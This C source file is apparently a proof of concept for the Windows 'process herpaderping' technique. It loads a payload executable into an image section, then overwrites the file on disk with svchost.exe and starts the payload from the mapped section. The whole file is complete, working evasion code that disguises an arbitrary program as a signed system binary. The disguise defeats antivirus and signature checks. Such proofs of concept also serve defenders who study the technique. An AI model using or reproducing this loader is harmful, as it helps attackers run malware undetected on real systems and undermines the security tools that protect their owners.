// Process herpaderping poc
// gcc auth_bypass.c -o auth_bypass.exe -lntdll (v15.2.0)


#include <windows.h>
#include <stdio.h>
#include <winternl.h>

// definitions

const wchar_t* payloadPath    = L"C:\\poc\\malware.exe"; // Exe you want to execute as a signed binary
const wchar_t* legitimatePath = L"C:\\Windows\\System32\\svchost.exe"; // Original file image (hash and sig donor)
const wchar_t* workingCopy    = L"C:\\poc\\svchost.exe"; // Copy of the original file - optional

typedef NTSTATUS (NTAPI* pNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef struct _RTL_USER_PROCESS_PARAMETERS_FULL {
    ULONG MaximumLength;
    ULONG Length;
    ULONG Flags;
    ULONG DebugFlags;
    HANDLE ConsoleHandle;
    ULONG ConsoleFlags;
    HANDLE StdInputHandle;
    HANDLE StdOutputHandle;
    HANDLE StdErrorHandle;
    UNICODE_STRING CurrentDirectoryPath;
    HANDLE CurrentDirectoryHandle;
    UNICODE_STRING DllPath;
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
    PVOID Environment;
    ULONG StartingPositionLeft;
    ULONG StartingPositionTop;
    ULONG Width;
    ULONG Height;
    ULONG CharWidth;
    ULONG CharHeight;
    ULONG ConsoleTextAttributes;
    ULONG WindowFlags;
    ULONG ShowWindowFlags;
    UNICODE_STRING WindowTitle;
    UNICODE_STRING DesktopName;
    UNICODE_STRING ShellInfo;
    UNICODE_STRING RuntimeData;
    ULONG EnvironmentSize;
    ULONG EnvironmentVersion;
} RTL_USER_PROCESS_PARAMETERS_FULL, *PRTL_USER_PROCESS_PARAMETERS_FULL;

typedef NTSTATUS (NTAPI* pNtCreateSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef NTSTATUS (NTAPI* pNtCreateProcessEx)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, ULONG, HANDLE, HANDLE, HANDLE, BOOLEAN);
typedef NTSTATUS (NTAPI* pNtCreateThreadEx)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, LPTHREAD_START_ROUTINE, LPVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, LPVOID);
typedef NTSTATUS (NTAPI* pNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI* pRtlCreateProcessParametersEx)(PRTL_USER_PROCESS_PARAMETERS_FULL*, PUNICODE_STRING, PUNICODE_STRING, PUNICODE_STRING, PUNICODE_STRING, PVOID, PUNICODE_STRING, PVOID, PVOID, PVOID, ULONG);
typedef NTSTATUS (NTAPI* pNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);

#define SEC_IMAGE 0x1000000
#define PROCESS_CREATE_FLAGS_INHERIT_HANDLES 0x4
#define RTL_USER_PROCESS_PARAMETERS_NORMALIZED 0x01

BOOL ReadFileToBuffer(const wchar_t* path, BYTE** buffer, DWORD* size) {
    HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open file: %lu\n", GetLastError());
        return FALSE;
    }
    *size = GetFileSize(hFile, NULL);
    if (*size == INVALID_FILE_SIZE || *size == 0) {
        printf("error reading file\n");
        CloseHandle(hFile);
        return FALSE;
    }

    *buffer = (BYTE*)malloc(*size);
    if (*buffer == NULL) {
        printf("malloc failed\n");
        CloseHandle(hFile);
        return FALSE;
    }

    DWORD bytesRead;
    if (!ReadFile(hFile, *buffer, *size, &bytesRead, NULL) || bytesRead != *size) {
        printf("error reading file\n");
        free(*buffer);
        *buffer = NULL;
        CloseHandle(hFile);
        return FALSE;
    }

    CloseHandle(hFile);
    return TRUE;
}

int main() {

    // resolve NT API's

    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    pNtAllocateVirtualMemory      NtAllocateVirtualMemory      = (pNtAllocateVirtualMemory)     GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    pNtCreateSection              NtCreateSection              = (pNtCreateSection)             GetProcAddress(hNtdll, "NtCreateSection");
    pNtCreateProcessEx            NtCreateProcessEx            = (pNtCreateProcessEx)           GetProcAddress(hNtdll, "NtCreateProcessEx");
    pNtCreateThreadEx             NtCreateThreadEx             = (pNtCreateThreadEx)            GetProcAddress(hNtdll, "NtCreateThreadEx");
    pNtQueryInformationProcess    NtQueryInformationProcess    = (pNtQueryInformationProcess)   GetProcAddress(hNtdll, "NtQueryInformationProcess");
    pRtlCreateProcessParametersEx RtlCreateProcessParametersEx = (pRtlCreateProcessParametersEx)GetProcAddress(hNtdll, "RtlCreateProcessParametersEx");
    pNtWriteVirtualMemory         NtWriteVirtualMemory         = (pNtWriteVirtualMemory)        GetProcAddress(hNtdll, "NtWriteVirtualMemory");

    if (!NtCreateSection || !NtCreateProcessEx || !NtCreateThreadEx ||
        !NtQueryInformationProcess || !RtlCreateProcessParametersEx ||
        !NtWriteVirtualMemory || !NtAllocateVirtualMemory) {
        printf("[-] Failed to resolve NT APIs\n");
        return 1;
    }
    printf("[*] Resolved NT APIs\n");


    BYTE* payloadBuffer = NULL; DWORD payloadSize = 0;
    BYTE* legitBuffer   = NULL; DWORD legitSize   = 0;

    // Begin process herpaderping - https://github.com/jxy-s/herpaderping
    if (!ReadFileToBuffer(payloadPath, &payloadBuffer, &payloadSize)) {
        printf("[-] Failed to read payload\n"); return 1;
    }
    printf("[*] Read payload (%lu bytes)\n", payloadSize);

    if (!ReadFileToBuffer(legitimatePath, &legitBuffer, &legitSize)) {
        printf("[-] Failed to read host binary\n"); free(payloadBuffer); return 1;
    }
    printf("[*] Read host binary (%lu bytes)\n", legitSize);

    
    HANDLE hFile = CreateFileW(workingCopy,
    GENERIC_READ | GENERIC_WRITE,
    FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
    NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to create working file: %lu - trying fallback copy\n", GetLastError());

        // ensure C:\poc\ exists
        CreateDirectoryW(L"C:\\poc", NULL);

        // copy the original file into our directory - no admin needed for read permission, allowing the copy
        const wchar_t *src = legitimatePath;
        if (!CopyFileW(src, workingCopy, FALSE)) {
            printf("[-] Copying host binary failed: %lu\n", GetLastError());
            return 1;
        }
        printf("[+] Copying host binary succeeded\n");

        // reopen the file
        hFile = CreateFileW(workingCopy,
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

        if (hFile == INVALID_HANDLE_VALUE) {
            printf("[-] Open after copy failed: %lu\n", GetLastError());
            return 1;
        }
    }

    DWORD bytesWritten;

    WriteFile(hFile, payloadBuffer, payloadSize, &bytesWritten, NULL);
    printf("[*] Wrote payload to disk (%lu bytes)\n", bytesWritten);

    // create image section from payload file
    HANDLE hSection = NULL;
    // przykumaj te kocie ruchy
    NTSTATUS status = NtCreateSection(&hSection,
        SECTION_ALL_ACCESS, NULL, NULL,
        PAGE_READONLY, SEC_IMAGE, hFile);

    if (status != 0) {
        printf("[-] NtCreateSection failed: 0x%lx\n", status);
        CloseHandle(hFile); return 1;
    }
    printf("[*] Created image section (handle: %p)\n", hSection);

    // swap disk to original binary
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    WriteFile(hFile, legitBuffer, legitSize, &bytesWritten, NULL);
    SetEndOfFile(hFile);
    CloseHandle(hFile);
    free(legitBuffer);
    printf("[*] Overwritten payload on disk with host binary\n");

    // create process from section
    HANDLE hProcess = NULL;
    status = NtCreateProcessEx(&hProcess,
        PROCESS_ALL_ACCESS, NULL,
        GetCurrentProcess(),
        PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
        hSection, NULL, NULL, FALSE);
    CloseHandle(hSection);

    if (status != 0) {
        printf("[-] NtCreateProcessEx failed: 0x%lx\n", status); return 1;
    }
    printf("[*] Process created (PID: %lu)\n", GetProcessId(hProcess));

    // set up process parameters
    UNICODE_STRING ntImagePath;
    wchar_t ntPath[MAX_PATH];
    wsprintfW(ntPath, L"\\??\\%s", workingCopy);
    RtlInitUnicodeString(&ntImagePath, ntPath);

    UNICODE_STRING dllPath;
    RtlInitUnicodeString(&dllPath, L"C:\\Windows\\System32");

    UNICODE_STRING currentDir;
    RtlInitUnicodeString(&currentDir, L"C:\\poc");

    UNICODE_STRING cmdLine;
    RtlInitUnicodeString(&cmdLine, workingCopy);

    UNICODE_STRING windowTitle;
    RtlInitUnicodeString(&windowTitle, L"payload");

    UNICODE_STRING desktopName;
    RtlInitUnicodeString(&desktopName, L"WinSta0\\Default");

    // get parent's environment
    PVOID parentEnv = GetEnvironmentStringsW();
    ULONG envSize = 0;
    {
        PWCHAR p = (PWCHAR)parentEnv;
        while (*p) {
            p += wcslen(p) + 1;
        }
        envSize = (ULONG)((PBYTE)(p + 1) - (PBYTE)parentEnv);
    }
    printf("[*] Environment set\n");

    PRTL_USER_PROCESS_PARAMETERS_FULL params = NULL;
    status = RtlCreateProcessParametersEx(
        (PRTL_USER_PROCESS_PARAMETERS_FULL*)&params,
        &ntImagePath,
        &dllPath,
        &currentDir,
        &cmdLine,
        parentEnv,
        &windowTitle,
        &desktopName,
        NULL, NULL,
        RTL_USER_PROCESS_PARAMETERS_NORMALIZED);

    if (status != 0) {
        printf("[-] RtlCreateProcessParametersEx failed: 0x%lx\n", status);
        TerminateProcess(hProcess, 1); return 1;
    }
    printf("[*] Process parameters created (MaxLen: %lu, EnvSize: %lu)\n",
        params->MaximumLength, params->EnvironmentSize);

    // calculate total size: params block + environment
    PBYTE paramsBase = (PBYTE)params;
    PBYTE paramsEnd = paramsBase + params->MaximumLength;

    if (params->Environment) {
        PBYTE envEnd = (PBYTE)params->Environment + envSize;
        if (envEnd > paramsEnd) {
            paramsEnd = envEnd;
        }
    }
    SIZE_T totalSize = paramsEnd - paramsBase;
    printf("[*] Total size: %llu bytes\n", (unsigned long long)totalSize);

    // allocate in remote process - try at same address first
    PVOID remoteParams = (PVOID)paramsBase;
    SIZE_T allocSize = totalSize;
    status = NtAllocateVirtualMemory(hProcess, &remoteParams, 0, &allocSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    BOOL needRebase = FALSE;
    if (status != 0 || remoteParams != (PVOID)paramsBase) {
        if (status != 0) {
            remoteParams = NULL;
            allocSize = totalSize;
            status = NtAllocateVirtualMemory(hProcess, &remoteParams, 0, &allocSize,
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (status != 0) {
                printf("[-] Remote alloc failed: 0x%lx\n", status);
                TerminateProcess(hProcess, 1); return 1;
            }
        }
        needRebase = TRUE;
    }

    if (needRebase) {
        LONG_PTR delta = (PBYTE)remoteParams - paramsBase;

        if (params->CurrentDirectoryPath.Buffer)
            params->CurrentDirectoryPath.Buffer = (PWSTR)((PBYTE)params->CurrentDirectoryPath.Buffer + delta);
        if (params->DllPath.Buffer)
            params->DllPath.Buffer = (PWSTR)((PBYTE)params->DllPath.Buffer + delta);
        if (params->ImagePathName.Buffer)
            params->ImagePathName.Buffer = (PWSTR)((PBYTE)params->ImagePathName.Buffer + delta);
        if (params->CommandLine.Buffer)
            params->CommandLine.Buffer = (PWSTR)((PBYTE)params->CommandLine.Buffer + delta);
        if (params->WindowTitle.Buffer)
            params->WindowTitle.Buffer = (PWSTR)((PBYTE)params->WindowTitle.Buffer + delta);
        if (params->DesktopName.Buffer)
            params->DesktopName.Buffer = (PWSTR)((PBYTE)params->DesktopName.Buffer + delta);
        if (params->ShellInfo.Buffer)
            params->ShellInfo.Buffer = (PWSTR)((PBYTE)params->ShellInfo.Buffer + delta);
        if (params->RuntimeData.Buffer)
            params->RuntimeData.Buffer = (PWSTR)((PBYTE)params->RuntimeData.Buffer + delta);
        if (params->Environment)
            params->Environment = (PVOID)((PBYTE)params->Environment + delta);
    }

    // write the entire block (params + environment)
    SIZE_T written;
    NtWriteVirtualMemory(hProcess, remoteParams, paramsBase, totalSize, &written);
    printf("[*] Wrote %llu bytes to remote process at %p\n",
        (unsigned long long)written, remoteParams);

    // update PEB
    PROCESS_BASIC_INFORMATION pbi = { 0 };
    NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
    printf("[*] PEB: %p\n", pbi.PebBaseAddress);

    NtWriteVirtualMemory(hProcess, (BYTE*)pbi.PebBaseAddress + 0x20,
        &remoteParams, sizeof(remoteParams), &written);
    printf("[*] Updated PEB->ProcessParameters to %p\n", remoteParams);

    // get image base and entry point
    PVOID imageBase = NULL;
    SIZE_T bytesReadSize;
    ReadProcessMemory(hProcess, (BYTE*)pbi.PebBaseAddress + 0x10,
        &imageBase, sizeof(imageBase), &bytesReadSize);
    printf("[*] Image base: %p\n", imageBase);

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payloadBuffer;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payloadBuffer + dosHeader->e_lfanew);
    DWORD entryPointRVA = ntHeaders->OptionalHeader.AddressOfEntryPoint;
    LPTHREAD_START_ROUTINE entryPoint = (LPTHREAD_START_ROUTINE)((BYTE*)imageBase + entryPointRVA);
    printf("[*] Entry point: %p (RVA: 0x%lx)\n", entryPoint, entryPointRVA);

    // create suspended thread
    HANDLE hThread = NULL;
    status = NtCreateThreadEx(&hThread,
        THREAD_ALL_ACCESS, NULL,
        hProcess, entryPoint, NULL,
        1,  // suspended flag
        0, 0x1000, 0x100000, NULL);

    if (status != 0) {
        printf("[-] NtCreateThreadEx failed: 0x%lx\n", status);
        TerminateProcess(hProcess, 1);
        free(payloadBuffer);
        return 1;
    }

    printf("\n[+] Process created SUSPENDED (PID: %lu)\n", GetProcessId(hProcess));
    printf("[*] Press ENTER to resume thread and execute payload...\n");
    getchar();

    ResumeThread(hThread);
    printf("[*] Thread resumed  payload running!\n");
    printf("[*] Waiting for payload to finish...\n");

    free(payloadBuffer);
    WaitForSingleObject(hProcess, 200000);
    DWORD exitCode;
    GetExitCodeProcess(hProcess, &exitCode);
    printf("[*] Exit code: 0x%lx\n", exitCode);
    
    if (exitCode == 0x41414141) {
        printf("[+] Confirmed payload executed (0x41414141)\n");
    }

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;
}